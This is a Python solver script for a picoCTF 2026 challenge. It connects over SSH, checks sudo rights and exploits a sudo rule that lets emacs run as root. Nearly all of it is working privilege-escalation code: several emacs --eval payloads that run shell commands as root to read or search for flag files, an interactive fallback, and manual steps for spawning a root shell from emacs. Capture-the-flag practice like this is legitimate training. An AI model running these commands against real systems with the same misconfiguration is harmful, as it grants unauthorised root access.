#!/usr/bin/env python3
"""
SUDO MAKE ME A SANDWICH - picoCTF 2026
Category: General Skills | Points: 50

Exploits misconfigured sudo permissions that allow running emacs as root.
Uses Emacs to spawn a root shell and read the flag.

Requirements:
    pip install paramiko

Usage:
    python3 solve.py

    Set the following environment variables (or edit the defaults below):
        SSH_HOST     - The challenge SSH host
        SSH_PORT     - The challenge SSH port
        SSH_USER     - The SSH username
        SSH_PASS     - The SSH password
"""

import os
import sys
import re
import time

try:
    import paramiko
except ImportError:
    print("[!] Missing dependency. Install with: pip install paramiko")
    print("[*] Alternatively, solve manually:")
    print("    1. ssh ctf-player@<host> -p <port>")
    print("    2. sudo -l")
    print('    3. sudo /bin/emacs -Q -nw --eval \'(term "/bin/bash")\'')
    print("    4. cat flag.txt")
    sys.exit(1)

# ─── Configuration ───────────────────────────────────────────────────────────
SSH_HOST = os.getenv("SSH_HOST", "challenge-host")
SSH_PORT = int(os.getenv("SSH_PORT", "22"))
SSH_USER = os.getenv("SSH_USER", "ctf-player")
SSH_PASS = os.getenv("SSH_PASS", "password-from-challenge")

FLAG_FILE = "flag.txt"


def exec_command(ssh, cmd, timeout=10):
    """Execute a command via SSH and return stdout."""
    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=timeout)
    output = stdout.read().decode("utf-8", errors="ignore")
    errors = stderr.read().decode("utf-8", errors="ignore")
    return output, errors


def find_flag(text):
    """Search for a picoCTF flag in text."""
    match = re.search(r'picoCTF\{[^}]+\}', text)
    if match:
        return match.group(0)
    return None


def solve_via_exec(ssh):
    """
    Try multiple methods to read the flag using sudo + emacs.
    """
    methods = [
        # Method 1: Use emacs --eval to run a shell command and print the flag
        (
            "Emacs --eval with shell-command-to-string",
            'sudo /bin/emacs --batch --eval \'(princ (shell-command-to-string "cat flag.txt"))\' 2>&1',
        ),
        # Method 2: Use emacs to insert file contents
        (
            "Emacs --batch insert-file-contents",
            'sudo /bin/emacs --batch --eval \'(progn (find-file "flag.txt") (princ (buffer-string)))\' 2>&1',
        ),
        # Method 3: Use emacs -script style
        (
            "Emacs batch with cat via shell",
            "sudo /bin/emacs --batch -f kill-emacs 2>&1; sudo /bin/emacs --batch --eval '(shell-command \"cat flag.txt\")' 2>&1",
        ),
        # Method 4: Direct cat via sudo emacs spawning a subshell
        (
            "Emacs term with cat",
            'sudo /bin/emacs --batch --eval \'(princ (shell-command-to-string "cat /home/*/flag.txt"))\' 2>&1',
        ),
        # Method 5: Try reading from various common flag locations
        (
            "Emacs reading /root/flag.txt",
            'sudo /bin/emacs --batch --eval \'(princ (shell-command-to-string "cat /root/flag.txt 2>/dev/null; cat /flag.txt 2>/dev/null; cat flag.txt 2>/dev/null"))\' 2>&1',
        ),
    ]

    for name, cmd in methods:
        print(f"  [*] Trying: {name}")
        output, errors = exec_command(ssh, cmd, timeout=15)
        combined = output + errors

        flag = find_flag(combined)
        if flag:
            print(f"  [+] Success with: {name}")
            return flag

        if combined.strip():
            # Show truncated output for debugging
            preview = combined.strip()[:200].replace("\n", " | ")
            print(f"      Output: {preview}")

    return None


def solve_via_interactive(ssh):
    """
    Fall back to interactive shell to read the flag through emacs.
    """
    print("  [*] Trying interactive shell approach...")

    channel = ssh.invoke_shell()
    time.sleep(1)

    # Read initial output
    if channel.recv_ready():
        channel.recv(4096)

    # Try direct cat with sudo
    channel.send("sudo /bin/emacs --batch --eval '(princ (shell-command-to-string \"cat flag.txt\"))'\n")
    time.sleep(3)

    output = ""
    while channel.recv_ready():
        output += channel.recv(4096).decode("utf-8", errors="ignore")

    flag = find_flag(output)
    if flag:
        return flag

    # Try via shell spawned from emacs
    channel.send("sudo /bin/emacs -Q --batch --eval '(progn (setq x (shell-command-to-string \"find / -name flag.txt -exec cat {} \\\\;\")) (princ x))'\n")
    time.sleep(5)

    output = ""
    while channel.recv_ready():
        output += channel.recv(4096).decode("utf-8", errors="ignore")

    flag = find_flag(output)
    if flag:
        return flag

    channel.close()
    return None


def main():
    print("[*] SUDO MAKE ME A SANDWICH - picoCTF 2026 Solver")
    print("=" * 50)

    # ─── Connect via SSH ─────────────────────────────────────────────────
    print(f"\n[*] Connecting to {SSH_HOST}:{SSH_PORT} as {SSH_USER}...")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(SSH_HOST, port=SSH_PORT, username=SSH_USER, password=SSH_PASS, timeout=15)
        print("[+] SSH connection established")
    except Exception as e:
        print(f"[!] SSH connection failed: {e}")
        print("\n[*] Manual solution:")
        print(f"    ssh {SSH_USER}@{SSH_HOST} -p {SSH_PORT}")
        print("    sudo -l")
        print("    sudo /bin/emacs flag.txt")
        print("    (or: sudo /bin/emacs --batch --eval '(princ (shell-command-to-string \"cat flag.txt\"))')")
        sys.exit(1)

    # ─── Reconnaissance ──────────────────────────────────────────────────
    print("\n[*] Reconnaissance...")

    output, _ = exec_command(ssh, "whoami")
    print(f"  [+] Current user: {output.strip()}")

    output, _ = exec_command(ssh, "ls -la")
    print(f"  [+] Directory listing:\n{output}")

    output, errors = exec_command(ssh, "cat flag.txt 2>&1")
    flag = find_flag(output)
    if flag:
        print(f"\n[+] Flag readable directly (no privesc needed)!")
        print(f"[+] FLAG: {flag}")
        ssh.close()
        return

    print(f"  [*] Direct read result: {(output + errors).strip()}")

    # ─── Check sudo privileges ───────────────────────────────────────────
    print("\n[*] Checking sudo privileges...")
    output, errors = exec_command(ssh, "sudo -l")
    print(f"  [+] sudo -l output:\n{output}{errors}")

    # ─── Exploit: Read flag via sudo emacs ───────────────────────────────
    print("\n[*] Exploiting sudo emacs to read the flag...")

    flag = solve_via_exec(ssh)

    if not flag:
        flag = solve_via_interactive(ssh)

    if flag:
        print(f"\n{'=' * 50}")
        print(f"[+] FLAG: {flag}")
        print(f"{'=' * 50}")
    else:
        print("\n[-] Could not automatically extract the flag.")
        print("[*] Manual steps:")
        print(f"    1. ssh {SSH_USER}@{SSH_HOST} -p {SSH_PORT}")
        print("    2. sudo /bin/emacs")
        print("    3. Press Alt+X, type 'shell', press Enter")
        print("    4. In the shell: cat flag.txt")

    ssh.close()
    print("\n[*] Done!")


if __name__ == "__main__":
    main()
